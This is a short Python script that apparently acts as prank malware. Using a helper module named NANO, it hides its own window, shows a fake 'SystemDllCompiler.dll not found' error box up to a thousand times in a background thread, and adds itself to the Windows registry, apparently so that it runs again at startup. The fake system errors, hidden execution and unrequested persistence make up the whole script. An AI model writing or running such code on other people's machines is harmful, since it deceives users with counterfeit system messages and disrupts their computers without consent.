import NANO
from threading import Thread

NANO.hidden()

def infinity_msgbox():
    
    for i in range(1000):
        NANO.msgbox("SystemDLL:",'SystemDllCompiler.dll not found.',16)
        




if __name__ == "__main__": 
    Thread(target=infinity_msgbox,args=tuple()).start()
    NANO.AddToRegistry(__file__)